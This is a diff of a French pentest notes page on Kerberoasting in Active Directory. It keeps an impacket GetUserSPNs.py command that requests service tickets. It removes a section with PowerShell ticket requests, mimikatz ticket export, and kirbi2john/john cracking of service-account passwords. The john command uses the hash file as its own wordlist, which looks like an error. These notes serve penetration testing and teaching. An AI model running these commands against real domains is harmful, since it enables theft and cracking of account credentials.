@@ -4,8 +4,6 @@ Un utilisateur de l’Active Directory peut demander un TGS pour n’importe que
 
 ### Récupération des tickets TGS
 
-#### Avec un compte sur le domaine
-
 ```
 GetUserSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
 ```
@@ -13,29 +11,6 @@ GetUserSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacke
 Cette commande va recenser tous les comptes utilisateur (non machine) exécutant un service (attribut `ServicePrincipalName` non vide) pour émettre une demande de ticket TGS en leur nom. Ces tickets seront ensuite affichés.
 
 Il n'est pas possible de réaliser de _Pass The Ticket_ avec les TGS.
-
-#### Avec une machine sur le domaine
-
-Il faut commencer par faire une demande de ticket avec un utilisateur _kerberoastable_ (visible dans `bloodhound` par exemple) __ :&#x20;
-
-```
-Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN-USER>' # <SPN-USER> est visible dans le détail d'un utilisateur sur bloodhound.
-```
-
-Ensuite, il faut récupérer le ticket. Pour cela, `mimikatz` peut être utilisé :&#x20;
-
-```
-# privilege::debug
-# kerberos::list /export
-```
-
-Grâce à la dernière commande `mimikatz`, il est possible de connaître le fichier contenant le ticket. Il ne reste qu'à casser le mot de passe contenu dans ce dernier :&#x20;
-
-```
-kirbi2john <FILE>.kirbi > <FILE>.txt
-john --fork=4 --format=krb5tgs --wordlist=<FILE>.txt <FILE>.txt
-```
 
 ### Cassage des _hashs_ obtenus
 
